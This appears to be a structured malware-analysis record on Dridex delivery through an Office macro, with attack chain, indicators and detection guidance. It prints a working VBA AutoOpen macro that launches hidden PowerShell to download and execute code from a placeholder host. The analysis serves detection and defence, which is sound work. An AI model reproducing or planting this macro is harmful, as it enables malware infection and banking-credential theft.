package_info.package_manager: N/A (malicious macro document, delivered via email spam)
package_info.why_malicious: Dridex is a banking Trojan distributed via malicious macro documents in spam campaigns. It is designed to steal banking credentials and facilitate financial fraud by infecting victims' systems through deceptive emails and executing unauthorized code. The macro abuses Office automation to launch PowerShell, which downloads and executes the Dridex payload, resulting in credential theft and system compromise.

execution_context.trigger: At document open, when the user enables macros
execution_context.file_location: Embedded VBA macro code within the malicious Microsoft Office document
required_permissions: filesystem (to write and execute downloaded payload)
network (to download remote payload via HTTP)

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim obj As Object
  Set obj = CreateObject("Wscript.Shell")
  obj.Run "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload')"
End Sub
malicious_snippets.code_behavior: At document open, the macro uses Wscript.Shell to launch a hidden PowerShell process, which downloads and executes code from a remote URL, resulting in the installation of the Dridex banking Trojan.

malice_analysis.why_suspicious: The macro automatically executes on document open and launches PowerShell to download and run code from an external domain, a hallmark of malware delivery. This behavior is highly indicative of malicious intent, as it enables remote code execution without user awareness.
malice_analysis.violated_expectations: Legitimate Office documents should not contain macros that invoke system shells or download and execute code from the internet. Standard business macros perform document automation, not remote code execution.
malice_analysis.similar_legitimate_use: Some enterprise environments use macros for document automation, but these do not download or execute code from external sources or invoke PowerShell.
key_indicators: Presence of AutoOpen macro that triggers on document open
Use of CreateObject("Wscript.Shell") to launch external processes
Execution of PowerShell with the -w hidden flag for stealth
PowerShell command downloads and executes code from a hardcoded external URL
No user interaction required beyond enabling macros

attack_chain.action: Victim receives a phishing email with a malicious Office document attachment.
attack_chain.leads_to: Victim opens the document and enables macros.

attack_chain.action: Malicious macro executes upon document open, launching a hidden PowerShell process.
attack_chain.leads_to: PowerShell downloads and executes the Dridex payload.

attack_chain.action: PowerShell downloads and executes the Dridex banking Trojan payload from a remote server.
attack_chain.leads_to: Dridex is installed on the victim's system, enabling credential theft and further malicious activity.

behavioral_signatures: Office macro with AutoOpen or Document_Open triggers that launch PowerShell or cmd.exe
VBA macros invoking Wscript.Shell to execute external processes
PowerShell processes spawned by Office applications downloading and executing code from external URLs
file_indicators: Office documents (e.g., .doc, .docm, .xlsm) containing embedded VBA macros
Macro code containing hardcoded external URLs or suspicious PowerShell commands
network_indicators: Outbound HTTP/HTTPS requests from Office or PowerShell processes to known Dridex C2 domains or suspicious, non-corporate domains
PowerShell making web requests to domains not associated with the organization
detection_knowledge.how_to_detect: Monitor for Office documents with macros that invoke Wscript.Shell to launch PowerShell or cmd.exe, especially those containing commands to download and execute code from the internet. Use endpoint protection to block or alert on suspicious macro activity. Implement network monitoring to detect outbound connections from Office or PowerShell processes to known Dridex infrastructure or untrusted domains. Flag Office documents with embedded macros that reference external URLs or contain suspicious PowerShell commands.
